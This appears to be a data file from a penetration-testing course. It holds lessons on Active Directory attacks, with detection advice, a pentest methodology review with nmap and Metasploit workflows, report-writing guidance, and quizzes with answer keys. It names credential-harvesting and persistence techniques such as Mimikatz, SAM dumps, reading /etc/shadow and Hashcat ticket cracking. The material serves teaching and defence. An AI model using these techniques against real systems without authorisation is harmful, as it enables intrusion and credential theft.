**The weakness:** Any authenticated user can request a TGS for ANY service with an SPN (Service Principal Name). The TGS is encrypted with the service account's NTLM hash. If you crack the hash, you have the service account's password.

**Why this works:**
1. You authenticate as a normal user (low privilege)
2. You ask the DC: "Give me a ticket for the SQL service"
3. The DC sends you a TGS encrypted with the SQL service account's hash
4. You take the TGS offline and crack it with Hashcat (mode 13100)
5. If the password is weak (and service accounts often have weak passwords), you crack it in minutes

**The key insight:** The DC doesn't check if you actually NEED access to the service. It just hands out the ticket. This is by design - Kerberos was built for usability, not security.

**Detection:** Monitor Event ID 4769 (TGS requests). If one user requests tickets for many SPNs in a short time, it's Kerberoasting.

## AS-REP Roasting - Attacking Pre-Auth Disabled Accounts

**The weakness:** Some accounts have "Do not require Kerberos pre-authentication" enabled. This means the DC sends the AS-REP (Authentication Service Response) without requiring the user to prove they know the password first.

**Why this works:**
1. Normally: User sends a timestamp encrypted with their password hash → DC verifies → sends TGT
2. With pre-auth disabled: User sends username → DC sends back the AS-REP encrypted with the user's hash (no proof required)
3. Attacker captures the AS-REP and cracks it offline (Hashcat mode 18200)

**The key insight:** Pre-authentication is a security feature that prevents offline attacks. Disabling it removes this protection entirely.

**Detection:** Monitor Event ID 4768 (TGT requests) for accounts with pre-auth disabled. Audit accounts with the DONT_REQUIRE_PREAUTH flag.

## Pass-the-Hash - Using Stolen Hashes Directly

**The weakness:** Windows NTLM authentication doesn't require the plaintext password - it only requires the hash. If you have the hash, you can authenticate as the user.

**Why this works:**
1. Attacker dumps password hashes from SAM database or LSASS process
2. Attacker uses the hash directly in an NTLM authentication request
3. The server verifies the hash matches - authentication succeeds
4. No password cracking required

**The key insight:** NTLM authentication is a challenge-response protocol. The server sends a challenge, the client responds with the hash. If you have the hash, you can respond correctly without knowing the password.

**Detection:** Monitor for NTLM authentication from unusual sources. Implement Credential Guard to protect LSASS. Restrict NTLM usage where possible.

## Golden Ticket - Forging Domain Admin Access

**The weakness:** The KRBTGT account hash is used to encrypt TGTs. If you have this hash, you can forge TGTs for ANY user, ANY group, with ANY expiration time.

**Why this works:**
1. Attacker obtains the KRBTGT hash (requires Domain Admin or DCSync)
2. Attacker creates a fake TGT claiming to be "Administrator" in "Domain Admins"
3. Attacker encrypts the TGT with the KRBTGT hash
4. The DC accepts the forged TGT as legitimate
5. Attacker has Domain Admin access for as long as they want

**The key insight:** The DC trusts any TGT encrypted with the KRBTGT hash. If you have the hash, you ARE the DC. This is the most powerful AD attack - it's essentially game over for the domain.

**Detection:** Protect the KRBTGT account. Change the password twice annually. Monitor for KRBTGT hash access. Detect TGTs with anomalous characteristics (unusual lifetime, modified fields).

## DCSync - Stealing All Domain Passwords

**The weakness:** Domain Controllers replicate password data between each other using the DRS (Directory Replication Service) protocol. Any account with Replicating Directory Changes permissions can request this data.

**Why this works:**
1. Attacker gains Domain Admin or Replicating Directory Changes privileges
2. Attacker's machine sends a replication request to the DC
3. The DC sends back ALL password hashes in the domain (including KRBTGT)
4. Attacker now has every password hash - can forge any ticket, impersonate anyone

**The key insight:** DCSync is not an exploit - it's a legitimate feature. The DC is designed to replicate password data to authorized machines. The attack is getting authorized access to request replication.

**Detection:** Monitor Event ID 4662 (Directory Service Access) for replication operations. Alert on non-DC machines performing directory replication. Restrict which accounts can replicate directory data.

## Attack Relationships

\`\`\`
Kerberoasting → Get service account password → Lateral movement
AS-REP Roasting → Get user password → Initial access
Pass-the-Hash → Authenticate without password → Lateral movement
DCSync → Get ALL hashes → Golden Ticket → Domain Admin forever
Golden Ticket → Impersonate anyone → Complete domain compromise
\`\`\`

:::checkpoint
You understand how Kerberos authentication works and why each attack exploits a specific weakness in the flow. You can explain the mechanism behind each attack, not just the commands.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Explain Kerberoasting, how it works at the protocol level, and how to detect it.',
        interviewAnswer: 'Kerberoasting exploits the fact that any authenticated user can request a TGS for any service with an SPN. The TGS is encrypted with the service account NTLM hash, which can be cracked offline with Hashcat mode 13100. Detection involves monitoring Event ID 4769 for high volumes of TGS requests from a single user in a short period, and mitigating by using strong passwords for service accounts and managed service accounts.',
        quiz: [
          {
            question: 'What is Kerberoasting?',
            options: [
              'Brute-forcing the Kerberos KDC password',
              'Requesting Service Tickets for accounts with SPNs and cracking them offline',
              'Intercepting Kerberos traffic on the network',
              'Disabling Kerberos authentication on a domain'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Kerberoasting exploits the ability of any authenticated user to request TGS tickets for SPNs, then cracks the ticket offline.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is the key difference between Kerberoasting and AS-REP Roasting?',
            options: [
              'Kerberoasting requires domain admin; AS-REP Roasting does not',
              'Kerberoasting targets accounts with SPNs; AS-REP Roasting targets accounts with pre-auth disabled',
              'They target the same type of accounts',
              'AS-REP Roasting requires physical access; Kerberoasting does not'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Kerberoasting attacks accounts with registered SPNs, while AS-REP Roasting targets accounts that do not require Kerberos pre-authentication.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is Pass-the-Hash?',
            options: [
              'Cracking a password hash offline',
              'Using a captured NTLM hash directly to authenticate without knowing the plaintext password',
              'Passing a hash to another user over the network',
              'Hashing passwords before transmission'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'PtH uses captured NTLM hashes directly in authentication protocols, bypassing the need to know the actual password.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'Why is the Golden Ticket considered the most powerful AD attack?',
            options: [
              'It is the easiest to perform',
              'It forges TGTs with the KRBTGT hash, granting unlimited domain access',
              'It only works on the latest Windows versions',
              'It requires physical access to the Domain Controller'
            ],
            correctAnswerIndex: 1,
            difficulty: 'advanced',
            explanation: 'A Golden Ticket allows forging TGTs for any user/group, providing persistent, undetectable access to the entire domain.',
            certTags: ['OSCP']
          },
          {
            question: 'What is DCSync?',
            options: [
              'Synchronizing DNS records across domain controllers',
              'Simulating a DC to replicate password hashes from the real DC',
              'Backing up the AD database',
              'Resetting the KRBTGT password'
            ],
            correctAnswerIndex: 1,
            difficulty: 'advanced',
            explanation: 'DCSync tricks a DC into replicating directory data, including all password hashes, by impersonating another DC.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is a key detection strategy for Kerberoasting?',
            options: [
              'Monitor for Event ID 4769 with high volume of TGS-REQ events',
              'Block all SPN registrations',
              'Disable Kerberos authentication',
              'Monitor for SSH connections'
            ],
            correctAnswerIndex: 0,
            difficulty: 'intermediate',
            explanation: 'Kerberoasting generates many TGS-REQ events (4769) in a short period, which is a key detection indicator.',
            certTags: ['OSCP']
          },
          {
            question: 'How often should the KRBTGT account password be changed to limit Golden Ticket exposure?',
            options: ['Monthly', 'Every 6 months (twice in succession)', 'Yearly', 'Never - it should remain static'],
            correctAnswerIndex: 1,
            difficulty: 'advanced',
            explanation: 'Microsoft recommends changing the KRBTGT password twice in succession to invalidate any existing Golden Tickets.',
            certTags: ['OSCP']
          },
          {
            question: 'What hardware is recommended for a full AD lab?',
            options: ['4GB RAM', '8GB RAM', '16GB RAM', '2GB RAM'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'A full AD lab with a DC and client VMs requires at least 16GB RAM for comfortable operation.',
            certTags: ['CEH']
          },
          {
            question: 'What does SPN stand for in Active Directory?',
            options: ['Secure Private Network', 'Service Principal Name', 'System Process Number', 'Security Protocol Node'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'SPN (Service Principal Name) uniquely identifies a service instance in an AD domain.',
            certTags: ['CEH']
          },
          {
            question: 'Which attack requires Domain Admin privileges to execute?',
            options: ['Kerberoasting', 'AS-REP Roasting', 'Golden Ticket', 'Pass-the-Hash'],
            correctAnswerIndex: 2,
            difficulty: 'advanced',
            explanation: 'A Golden Ticket requires the KRBTGT hash, which is only obtainable with Domain Admin access or through DCSync.',
            certTags: ['OSCP']
          },
          {
            question: 'What Hashcat mode number is used for Kerberoasting TGS tickets?',
            options: ['0', '1000', '13100', '18200'],
            correctAnswerIndex: 2,
            difficulty: 'advanced',
            explanation: 'Hashcat mode 13100 is specifically for cracking Kerberos 5 TGS-REP tickets (RC4-HMAC).',
            certTags: ['OSCP']
          },
          {
            question: 'What is the DONT_REQUIRE_PREAUTH flag used for in AS-REP Roasting?',
            options: [
              'It forces all users to use pre-authentication',
              'It identifies accounts that do not require Kerberos pre-authentication, making them vulnerable to AS-REP Roasting',
              'It disables NTLM authentication',
              'It enables two-factor authentication for Kerberos'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Accounts with DONT_REQUIRE_PREAUTH set can be targeted by AS-REP Roasting because they respond to authentication requests without pre-validation.',
            certTags: ['OSCP']
          },
          {
            question: 'Which Event ID should you monitor for DCSync detection?',
            options: ['Event ID 4624', 'Event ID 4662', 'Event ID 4768', 'Event ID 4771'],
            correctAnswerIndex: 1,
            difficulty: 'advanced',
            explanation: 'Event ID 4662 logs Directory Service Access, including replication operations that DCSync triggers.',
            certTags: ['OSCP']
          }
        ]
      }
    ]
  },
  {
    id: 'week35',
    title: 'Review & Documentation',
    durationText: 'Week 35',
    focus: 'Consolidate Phase 5 knowledge, practice a full attack methodology, and create professional pentest documentation.',
    output: 'Complete pentest write-up for a lab exercise and methodology reference sheet.',
    topics: [
      {
        id: 'we35d01',
        title: 'Attack Methodology Review',
        description: 'Consolidate the full penetration testing methodology from recon through post-exploitation.',
        type: 'review',
        duration: '2 hours',
        content: `:::objectives
- Walk through the complete attack chain methodology
- Build a tool selection decision tree
- Identify common mistakes and how to avoid them
:::

## The Pentest Lifecycle

### Phase 1: Reconnaissance
**Goal:** Gather as much information as possible without touching the target directly.

| Task                      | Tool                    |
|--------------------------|-------------------------|
| DNS enumeration           | dig, nslookup, fierce   |
| Subdomain discovery        | subfinder, amass        |
| WHOIS lookup              | whois                   |
| Google dorking            | Google, Maltego         |
| Technology fingerprinting  | Wappalyzer, WhatWeb     |

:::tip
Passive recon (OSINT) leaves no traces. Spend adequate time here before actively scanning.
:::

### Phase 2: Scanning
**Goal:** Identify live hosts, open ports, services, and OS.

| Task                      | Tool                    |
|--------------------------|-------------------------|
| Host discovery            | nmap -sn                |
| Port scanning             | nmap -sS -sV            |
| Service enumeration       | nmap --script=default   |
| Vulnerability scanning     | nmap --script=vuln      |

**Workflow:**
\`\`\`bash
# 1. Discover hosts
nmap -sn 192.168.1.0/24

# 2. Scan specific hosts
nmap -sS -sV -T4 -p- 192.168.1.100

# 3. Enumerate discovered services
nmap --script=default,vuln -sV 192.168.1.100

# 4. Save everything
nmap -sS -sV -A -oA full_scan 192.168.1.100
\`\`\`

### Phase 3: Enumeration
**Goal:** Deep-dive into discovered services for further attack vectors.

| Service | Enumeration Focus                | Tool               |
|--------|----------------------------------|--------------------|
| HTTP   | Directories, headers, tech stack | gobuster, whatweb  |
| SMB    | Shares, users, OS                | smbclient, enum4linux|
| SSH    | Version, algorithms              | nmap --script=ssh  |
| FTP    | Anonymous access, version        | nmap, ftp client   |
| MySQL  | Version, users                   | nmap, mysql client |

### Phase 4: Exploitation
**Goal:** Gain initial access using identified vulnerabilities.

**Tool Selection:**

| Scenario                      | Tool                          |
|------------------------------|-------------------------------|
| Known vulnerability (CVE)    | Metasploit, searchsploit      |
| Web application flaw          | Burp Suite, sqlmap            |
| Default/weak credentials      | Hydra, Medusa                 |
| Custom exploit needed         | Python, pwntools              |

**Metasploit Workflow:**
\`\`\`bash
search type:exploit <platform> <service>
use <exploit_path>
show options
set RHOSTS <target>
set LHOST <attacker_ip>
set PAYLOAD <payload>
check
exploit
\`\`\`

### Phase 5: Post-Exploitation
**Goal:** Maximize access, pivot, and document findings.

| Task                    | Linux                    | Windows                  |
|------------------------|--------------------------|--------------------------|
| System info            | uname -a, id             | systeminfo, whoami       |
| Privilege escalation    | LinPEAS, GTFOBins        | WinPEAS, Potato attacks  |
| Credential harvesting   | /etc/shadow, hashdump    | Mimikatz, SAM dump       |
| Persistence            | Cron jobs, SSH keys      | Registry, scheduled tasks|
| Lateral movement        | SSH pivoting             | Pass-the-Hash, PtH       |

## Tool Selection Decision Tree

\`\`\`
Found open port?
├── HTTP/HTTPS → gobuster, nikto, Burp Suite
├── SSH → hydra (brute force), check version
├── SMB → enum4linux, smbclient, smbmap
├── FTP → anonymous check, hydra
├── MySQL → hydra, default creds check
└── Custom service → banner grab, search for exploits
\`\`\`

## Common Mistakes

1. **Skipping reconnaissance:** Always gather OSINT before scanning
2. **Not saving output:** Use \`-oA\` for every Nmap scan
3. **Rushing to exploit:** Verify with \`check\` first
4. **Ignoring post-exploitation:** Finding the vulnerability is only half the job
5. **Not documenting:** Take screenshots and notes throughout

:::checkpoint
Walk through the full attack methodology from memory. What tools would you use at each phase if you found a vulnerable IIS web server?
:::
`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Walk me through your penetration testing methodology and explain why reconnaissance is the most important phase.',
        interviewAnswer: 'My methodology follows five phases: Reconnaissance gathers OSINT without touching the target, Scanning identifies live hosts and services with Nmap, Enumeration deep-dives into discovered services, Exploitation gains initial access using identified vulnerabilities, and Post-Exploitation escalates privileges and documents findings. Reconnaissance is most important because it guides all subsequent phases, reveals attack vectors, and prevents wasting time on wrong targets.',
        quiz: [
          {
            question: 'What is the correct order of the penetration testing methodology?',
            options: [
              'Exploitation → Scanning → Reconnaissance → Post-exploitation',
              'Reconnaissance → Scanning → Enumeration → Exploitation → Post-exploitation',
              'Scanning → Enumeration → Reconnaissance → Exploitation',
              'Enumeration → Scanning → Exploitation → Post-exploitation'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'The standard flow is Recon → Scanning → Enumeration → Exploitation → Post-exploitation.',
            certTags: ['OSCP', 'CEH', 'CompTIA Security+']
          },
          {
            question: 'What is the difference between passive and active reconnaissance?',
            options: [
              'Passive uses Nmap; active uses NSE scripts',
              'Passive gathers information without touching the target; active directly interacts with the target',
              'Passive is faster; active is slower',
              'Passive is only for web apps; active is for network services'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Passive recon (OSINT) does not contact the target directly. Active recon involves direct scanning and probing.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'Why should you use nmap -oA for every scan?',
            options: [
              'It makes the scan faster',
              'It saves output in all formats (normal, XML, grepable) for later reference',
              'It enables NSE scripts automatically',
              'It increases scan accuracy'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: '-oA saves in all three formats, ensuring you have output for manual review, tool import, and grep parsing.',
            certTags: ['OSCP']
          },
          {
            question: 'Which tool is best for directory brute-forcing on a web server?',
            options: ['nmap', 'gobuster', 'john', 'hashcat'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Gobuster is specifically designed for directory and DNS brute-forcing.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What should you always do before running an exploit in Metasploit?',
            options: ['Run nmap again', 'Use the check command', 'Generate a new payload', 'Restart msfconsole'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'check tests if the target appears vulnerable without actually exploiting it, saving time and reducing noise.',
            certTags: ['OSCP']
          },
          {
            question: 'What is the purpose of post-exploitation?',
            options: [
              'To find more vulnerabilities on the target network',
              'To maximize access, gather evidence, and pivot to other systems',
              'To clean up exploitation artifacts',
              'To scan for new targets'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Post-exploitation involves escalating privileges, harvesting credentials, documenting findings, and potentially pivoting.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What tool would you use for SMB enumeration on a Linux attacker machine?',
            options: ['gobuster', 'enum4linux', 'sqlmap', 'john'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'enum4linux is designed for enumerating SMB shares, users, and policies on Windows systems.',
            certTags: ['CEH']
          },
          {
            question: 'Why is skipping reconnaissance a mistake?',
            options: [
              'It makes scans slower',
              'You may miss attack vectors and waste time on the wrong services',
              'It triggers IDS more often',
              'Nmap requires recon data to function'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Reconnaissance reveals context (technologies, subdomains, contacts) that guides scanning and exploitation efforts.',
            certTags: ['CEH']
          },
          {
            question: 'What tool is used for web application vulnerability scanning?',
            options: ['enum4linux', 'Nikto', 'John the Ripper', 'LinPEAS'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Nikto scans web servers for known vulnerabilities, misconfigurations, and dangerous files.',
            certTags: ['CEH']
          },
          {
            question: 'What is the purpose of the searchsploit command?',
            options: [
              'Scans for live hosts on the network',
              'Searches the local Exploit-DB database for known exploits',
              'Brute-forces SSH passwords',
              'Enumerates SMB shares'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'searchsploit queries the local copy of Exploit-DB to find public exploits matching a service or CVE.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'If you find an open port 445, what is the next enumeration step?',
            options: [
              'Run a UDP scan',
              'Use smbclient or enum4linux to enumerate shares and users',
              'Immediately run an exploit',
              'Check for HTTP on port 80'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Port 445 is SMB. Enumerating shares, users, and policies reveals further attack opportunities.',
            certTags: ['CEH']
          },
          {
            question: 'What should you document during a penetration test?',
            options: [
              'Only the final vulnerabilities found',
              'Everything: scans, commands, screenshots, findings, and remediation steps',
              'Only the exploitation steps',
              'Nothing until the report is written'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Thorough documentation throughout the test ensures accurate reporting and evidence for findings.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is a common mistake when exploiting a vulnerability?',
            options: [
              'Using the check command first',
              'Running the exploit without verifying the target is vulnerable',
              'Saving the scan results',
              'Documenting the findings'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Running exploits blindly wastes time and creates unnecessary noise. Always verify first.',
            certTags: ['OSCP']
          }
        ]
      },
      {
        id: 'we35d02',
        title: 'Documentation & Write-ups',
        description: 'Learn to create professional pentest reports and GitHub write-up templates.',
        type: 'project',
        duration: '2 hours',
        content: `:::objectives
- Structure a professional penetration test report
- Create a GitHub write-up template
- Collect and organize evidence with screenshots
- Write actionable remediation recommendations
:::

## Pentest Report Structure

### Executive Summary (1 page)
- Scope of the assessment
- High-level findings (number of critical, high, medium, low)
- Overall risk rating
- Top 3 recommendations

### Technical Findings (Main Body)
For each finding:

\`\`\`markdown
## [SEVERITY] Finding Title

### Description
What the vulnerability is and why it matters.

### Affected System
IP address, port, service, URL - be specific.

### Steps to Reproduce
1. Step one
2. Step two
3. Step three

### Evidence
[Screenshot or output showing the issue]

### Impact
What an attacker could achieve by exploiting this.

### Remediation
How to fix the vulnerability, with specific steps.

### References
- CVE-XXXX-XXXXX
- OWASP link
- Vendor advisory
\`\`\`

### Appendix
- Full Nmap scan results
- Tool output logs
- Methodology description
- CVSS scores for each finding

## GitHub Write-Up Template

\`\`\`markdown
# [Challenge/Target Name]

## Overview
- **Target:** [IP/URL]
- **OS/Platform:** [Windows/Linux]
- **Difficulty:** [Easy/Medium/Hard]
- **Date:** [YYYY-MM-DD]

## Enumeration

### Nmap Scan
\`\`\`bash
nmap -sV -sC -p- [target]
\`\`\`
[Output and analysis]

### Service Enumeration
[Findings per service]

## Exploitation

### Initial Access
[How you gained access]

### Privilege Escalation
[How you escalated]

## Lessons Learned
[Key takeaways]
\`\`\`

## Evidence Collection Best Practices

### Screenshots
- Capture the full terminal/window
- Include timestamps where possible
- Show the command and the output
- Use consistent naming: \`step1_nmap.png\`, \`step2_enum.png\`

### Command Output
- Save raw output to files
- Use \`script | tee output.txt\` to capture in real-time
- Include tool versions in your notes

### Organizing Evidence
\`\`\`
writeup/
├── screenshots/
│   ├── 01_nmap_scan.png
│   ├── 02_smb_enum.png
│   └── 03_shell_obtained.png
├── output/
│   ├── nmap_full.txt
│   ├── gobuster_results.txt
│   └── john_cracked.txt
└── report.md
\`\`\`

## Remediation Writing Tips

:::tip
Good remediation is specific and actionable. Instead of "fix the vulnerability," write "upgrade Apache to version 2.4.51 or later."
:::

### Remediation Quality Examples

**Bad:** "Patch the system."

**Good:** "Apply Microsoft Security Update KB5008380 to resolve CVE-2022-21893. Test the update in a staging environment before deploying to production."

**Bad:** "Change the password."

**Good:** "Change the default credentials on the Apache Tomcat manager interface to a password of at least 16 characters including uppercase, lowercase, numbers, and special characters. Remove or restrict access to the manager interface from external networks."

## Report Writing Checklist

- [ ] Executive summary is concise (1 page max)
- [ ] Every finding has steps to reproduce
- [ ] Every finding has evidence (screenshot or output)
- [ ] Remediation is specific and actionable
- [ ] All scan results are included in the appendix
- [ ] Screenshots are labeled and referenced in the text
- [ ] Technical jargon is explained where needed
- [ ] Risk ratings match CVSS or organizational standards
- [ ] Contact information for questions is included

:::classwork
Write a full pentest write-up for a lab exercise. Use the template above, include at least 3 findings with different severity levels, and provide specific remediation for each.
:::

:::checkpoint
Given the following scenario, what would your report include?
- You found an open SMB share with sensitive files
- You escalated from user to root using a SUID binary
- You cracked a weak password on an SSH server

Write a brief executive summary and one detailed finding entry.
:::
`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'What makes a good pentest report, and how do you write actionable remediation recommendations?',
        interviewAnswer: 'A good report includes an executive summary for stakeholders, detailed technical findings with steps to reproduce, evidence like screenshots and tool output, and specific remediation steps. Good remediation is actionable: instead of patch the system, write apply Microsoft KB5008380 to resolve CVE-2022-21893. Include CVSS scores, affected systems, and test the update in staging before production. Every finding needs reproducible steps and verifiable evidence.',
        quiz: [
          {
            question: 'What should the executive summary of a pentest report contain?',
            options: [
              'Full technical details of every vulnerability',
              'Scope, high-level findings, overall risk rating, and top recommendations',
              'Only the most critical vulnerability',
              'Tool commands and output'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'The executive summary provides a concise overview for non-technical stakeholders, focusing on risk and key recommendations.',
            certTags: ['OSCP', 'CEH', 'CompTIA Security+']
          },
          {
            question: 'What is the correct format for documenting a technical finding?',
            options: [
              'Description → Evidence → Impact → Remediation → Steps to Reproduce',
              'Description → Affected System → Steps to Reproduce → Evidence → Impact → Remediation → References',
              'Evidence only - no text needed',
              'Just a screenshot and CVE number'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'A complete finding includes description, affected system, reproduction steps, evidence, impact, remediation, and references.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is the best way to capture terminal output during a pentest?',
            options: [
              'Take a photo with your phone',
              'Use script | tee output.txt to capture in real-time',
              'Copy-paste from the terminal after the fact',
              'Just remember the commands'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'tee captures output both to the screen and to a file simultaneously, ensuring nothing is missed.',
            certTags: ['OSCP']
          },
          {
            question: 'What makes a good remediation recommendation?',
            options: [
              'Fix the issue',
              'Patch the system',
              'Specific, actionable steps including version numbers or configuration changes',
              'Contact the vendor'
            ],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'Good remediation is specific: it includes version numbers, configuration changes, and concrete steps to resolve the issue.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is the purpose of an appendix in a pentest report?',
            options: [
              'To repeat the executive summary',
              'To include detailed scan results, tool output, and methodology details',
              'To list all employees at the company',
              'To describe the testing team\'s schedule'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'The appendix provides supporting details that would clutter the main report but are essential for completeness.',
            certTags: ['CEH']
          },
          {
            question: 'How should screenshots be named in a write-up?',
            options: [
              'Random names like img001.png',
              'Descriptive names like 01_nmap_scan.png or 03_shell_obtained.png',
              'Only dates like 2024-01-15.png',
              'No naming convention needed'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Descriptive names make it easy to find and reference evidence without opening each file.',
            certTags: ['OSCP']
          },
          {
            question: 'What is a key difference between the executive summary and technical findings sections?',
            options: [
              'They contain the same information at different lengths',
              'Executive summary is for technical staff; technical findings are for management',
              'Executive summary is high-level for stakeholders; technical findings are detailed for technical teams',
              'Executive summary includes tool output; technical findings do not'
            ],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'The executive summary communicates risk to non-technical decision-makers, while technical findings provide the detail technical teams need to remediate.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'Why is it important to include the methodology in the report appendix?',
            options: [
              'To fill space',
              'To show what tools were used and establish the scope and limitations of the test',
              'To list all vulnerabilities found',
              'To provide contact information'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Methodology documentation establishes what was tested, how, and the limitations - important for context and legal purposes.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What severity rating would you assign to an SMB share containing sensitive files accessible to anyone?',
            options: ['Low', 'Medium', 'High', 'Informational'],
            correctAnswerIndex: 2,
            difficulty: 'intermediate',
            explanation: 'Unauthenticated access to sensitive files represents a high-severity finding due to the direct exposure of confidential data.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What should you include in the "Steps to Reproduce" section?',
            options: [
              'Only the final result',
              'Exact commands, URLs, and actions needed to reproduce the vulnerability',
              'A general description of the attack',
              'The remediation steps'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Steps to reproduce must be precise enough that someone else can follow them to see the same vulnerability.',
            certTags: ['OSCP']
          },
          {
            question: 'What is the recommended maximum length for an executive summary?',
            options: ['5 pages', '1 page', '10 pages', 'No limit'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'An executive summary should be concise - typically one page - focusing on key findings and recommendations.',
            certTags: ['CEH']
          },
          {
            question: 'What is CVSS and why is it included in a report?',
            options: [
              'A tool for scanning vulnerabilities',
              'A standardized scoring system for rating vulnerability severity',
              'A certification for pentesters',
              'A type of encryption algorithm'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'CVSS (Common Vulnerability Scoring System) provides standardized severity scores that help organizations prioritize remediation.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'Why should you reference CVE numbers in your findings?',
            options: [
              'To make the report longer',
              'To link the finding to authoritative information and official advisories',
              'CVEs are required by law',
              'They are not important'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'CVE references provide authoritative context, affected versions, and official remediation guidance from vendors.',
            certTags: ['CEH', 'OSCP']
          }
        ]
      }
    ]
  }
];
